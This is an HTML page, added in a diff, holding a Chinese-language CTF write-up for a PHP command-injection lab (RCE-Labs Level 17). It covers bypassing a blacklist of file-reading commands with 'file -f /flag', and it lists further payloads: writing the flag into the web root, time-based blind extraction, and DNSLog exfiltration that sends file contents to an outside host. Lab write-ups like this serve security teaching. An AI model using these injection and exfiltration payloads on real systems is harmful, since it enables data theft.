@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: RCE-Labs Level 17 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(168, 85, 247, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(168, 85, 247, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #a855f7; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #a855f7; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #a855f7; text-shadow: 0 0 15px rgba(168, 85, 247, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(168, 85, 247, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(168, 85, 247, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #a855f7; font-size: 0.8rem; }
+        h2 { color: #00f0ff; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #00f0ff; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #a855f7; text-decoration: none; border: 1px solid #a855f7; padding: 10px 24px; border-radius: 30px; transition: 0.3s; font-size: 0.95rem; }
+        .action-link:hover { background: rgba(168, 85, 247, 0.1); transform: translateY(-3px); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        .action-link.secondary:hover { color: #ccd6f6; border-color: #ccd6f6; background: rgba(255,255,255,0.05); }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-terminal"></i> RCE-Labs Level 17 - file 命令识别文件类型与报错泄露</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年10月3日</span>
+            <span><i class="fas fa-tag"></i> RCE-Labs</span>
+            <span><i class="fas fa-tag"></i> 黑名单绕过</span>
+            <span><i class="fas fa-tag"></i> 信息收集</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>RCE-Labs Level 17 (file 命令识别文件类型)</li>
+            <li><strong>靶场链接：</strong>http://靶机IP:8080/less-17/</li>
+            <li><strong>涉及工具：</strong>浏览器</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>黑名单封禁了 <code>strings</code> 和 <code>grep</code>，所有常规读取工具已全军覆没。题目提示使用 <code>file</code> 命令。这是一个“元数据识别”与“报错信息泄露”的综合考点。</p>
+
+        <h3>2. 怎么解（详细步骤与输出解析）</h3>
+        
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 源码核心逻辑</h4>
+            <pre><code>$pattern = '/cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep/';
+if(!preg_match($pattern,$cmd)){
+    system($cmd);
+}</code></pre>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-check-circle"></i> 第一步：确认文件类型</h4>
+            <pre><code>?cmd=file /flag</code></pre>
+            <p><strong>回显：</strong><code>/flag: ASCII text</code></p>
+            <p><strong>解析：</strong><code>file</code> 命令通过读取文件的“魔数”（Magic Number，即文件头部特征字节）来识别文件类型。它不关心文件内容是什么，只告诉你它是个什么文件。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-check-circle"></i> 第二步：利用 -f 参数触发报错泄露（最终 Payload）</h4>
+            <pre><code>?cmd=file -f /flag</code></pre>
+            <p><strong>回显：</strong><code>flag{TEST_Dynamic_FLAG}: cannot open 'flag{TEST_Dynamic_FLAG}' (No such file or directory)</code></p>
+            <p><strong>原理解析：</strong><code>file</code> 命令的 <code>-f</code> 参数含义是“从指定文件中读取要检查的文件名列表”。当我们执行 <code>file -f /flag</code> 时，它会把 <code>/flag</code> 的内容（也就是 <code>flag{TEST_Dynamic_FLAG}</code>）当作一个文件名去寻找。因为系统中不存在这个文件，<code>file</code> 会报错并把文件名打印在错误信息里，从而将 flag 泄露。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-book"></i> 拓展：其他利用参数报错泄露的技巧</h4>
+            <p>刚才我们使用了 <code>file -f /flag</code>，其核心思路是：<strong>让程序将文件内容当作参数去处理，利用其报错机制回显内容。</strong>类似的操作还有：</p>
+            <ul>
+                <li><code>find /flag -exec cat {} \;</code>（若 /flag 内容被解析为路径，可能触发报错）</li>
+                <li><code>wc -c /flag</code> 或 <code>md5sum /flag</code>（若将文件内容误认为文件名，也会在报错时泄露）</li>
+                <li><code>cp /flag /tmp/1</code>（如果 /flag 内容被当作源文件名，报错“找不到文件”会回显内容）</li>
+            </ul>
+            <p><strong>无回显时的通用利用思路：</strong></p>
+            <ul>
+                <li><strong>报错回显：</strong>依赖 PHP 配置 <code>display_errors = On</code>。</li>
+                <li><strong>写入 Web 目录：</strong><code>?cmd=cat /flag > /var/www/html/1.txt</code>，然后浏览器访问该文件。</li>
+                <li><strong>管道与 tee：</strong><code>?cmd=cat /flag | tee /var/www/html/1.txt</code>，同时回显和写文件。</li>
+                <li><strong>时间盲注：</strong><code>?cmd=if [ "$(cat /flag | cut -c 1)" == "f" ]; then sleep 3; fi</code>，通过响应时间判断字符。</li>
+                <li><strong>DNSLog 外带：</strong><code>?cmd=ping -c 1 `cat /flag`.dnslog.cn</code>，通过查看 DNS 日志获取内容。</li>
+            </ul>
+            <p><strong>元数据读取命令：</strong>如果 Flag 是文件名或可以通过文件信息推断，可使用 <code>ls -l</code>、<code>stat /flag</code>、<code>du -b /flag</code> 等命令。</p>
+        </div>
+
+        <h3>3. 怎么迁移（跨学科与跨领域联想）</h3>
+        <ul>
+            <li><strong>文件类型鉴别与恶意软件分析：</strong>在应急响应中，发现一个可疑文件（如 <code>invoice.pdf</code>），运行 <code>file invoice.pdf</code> 发现它其实是 <code>PE32 executable</code>（Windows 可执行文件），这立刻就能判断出这是一次伪装攻击。</li>
+            <li><strong>报错信息泄露漏洞：</strong>在 Web 安全中，程序员如果在错误页面直接回显了 SQL 查询语句或文件路径，就可能导致敏感信息泄露。这题就是利用命令本身的报错逻辑将文件内容外带出来。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. file 命令与魔数 (Magic Number)</h4>
+            <p><code>file</code> 命令依赖于系统中存储的文件特征库（通常是 <code>/usr/share/misc/magic.mgc</code>）。它读取文件的前几个字节，与特征库进行比对。例如，PNG 图片的前 8 个字节固定是 <code>89 50 4E 47 0D 0A 1A 0A</code>，ZIP 压缩包前几个字节是 <code>50 4B 03 04</code>。这就是“魔数”的底层逻辑。</p>
+
+            <h4>2. -f 参数与文件列表</h4>
+            <p><code>file -f 文件名</code> 意味着“从文件中读取要检查的文件名列表，然后检查这些文件”。如果列表中的文件名包含特殊字符或不存在，<code>file</code> 往往在报错时会原样输出该字符串。这是典型的“利用程序副作用（报错）来获取信息”的渗透思路。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面关卡的区别</h3>
+        <p>前面几关是在“读内容”和“换编码”上做文章，而 Level 17 是第一次利用工具的<strong>错误处理机制</strong>来泄露数据。从“读”变成了“骗”，这是渗透测试中非常关键的思维转变。</p>
+
+        <h3>2. 如何抽象理解概念（大白话）</h3>
+        <p>把文件比作一个快递包裹。前面用 <code>cat</code> 是直接把包裹拆开看里面的物品；用 <code>base64</code> 是把物品拍成照片传出来；而 Level 17 的 <code>file -f</code>，是你没拆包裹，而是把包裹上的“寄件人名单”当作收件人地址去邮局查，结果邮局大喊“收件人不存在”，把寄件人的名字（也就是 Flag）暴露了出来。</p>
+
+        <div class="action-bar">
+            <a href="/rce-labs.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 RCE-Labs 列表</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
